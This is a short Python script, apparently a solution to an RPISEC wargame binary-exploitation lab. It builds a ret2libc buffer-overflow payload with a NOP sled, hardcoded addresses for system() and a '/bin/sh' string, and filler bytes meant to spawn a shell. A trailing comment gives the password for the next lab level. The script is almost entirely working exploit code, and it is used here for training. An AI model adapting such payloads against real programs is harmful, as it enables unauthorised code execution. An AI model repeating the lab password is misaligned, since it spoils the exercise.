import struct
system = struct.pack("I", 0xb7e63190)
junk = b"AAAA"
binsh = struct.pack("I", 0xb7e23000+0x160a24)
payload = b"\x90" * 80
pad = b"rpisec"
print(pad)
print(payload + system + junk + binsh + b'\n')
#lab3B pass: th3r3_iz_n0_4dm1ns_0n1y_U!
